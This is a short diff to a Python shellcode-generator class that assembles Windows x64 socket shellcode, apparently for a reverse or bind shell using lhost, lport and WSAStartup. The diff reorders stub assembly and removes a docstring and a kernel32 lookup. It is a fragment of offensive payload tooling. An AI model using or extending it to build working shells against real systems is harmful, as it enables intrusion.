@@ -106,9 +106,7 @@ class Shellcode():
         return
 
     def set_args(self):
-        """Sets the shell environment that will be returned upon execution of shellcode.
-        This function will return the size of the buffer used by the shell environment.
-        """
+        
         argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
         argv_dict.update(modparser.argument_check(Shellcode.advanced, self.arg_list))
         if (argv_dict == None):
@@ -172,17 +170,13 @@ class Shellcode():
                                     self.stack_space,
                                     self.op_as_func,
                                     self.exit_func)
+        
+        shellcode = win_stubs.get_prologue()
+        shellcode += win_stubs.get_resolver()
 
-        sin_addr = hex(convert.ip_str_to_inet_addr(self.lhost))
         sin_port = struct.pack('<H', self.lport).hex()
         sin_family = struct.pack('>H', ws2def.AF_INET).hex()
-
-        shellcode = win_stubs.get_prologue()
-
-        shellcode += """    call getKernel32
-    mov rdi, rax\n"""
-
-        shellcode += win_stubs.get_resolver()
+        sin_addr = hex(convert.ip_str_to_inet_addr(self.lhost))
 
         shellcode += f"""
 ; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX => MAKEWORD(2, 2) 
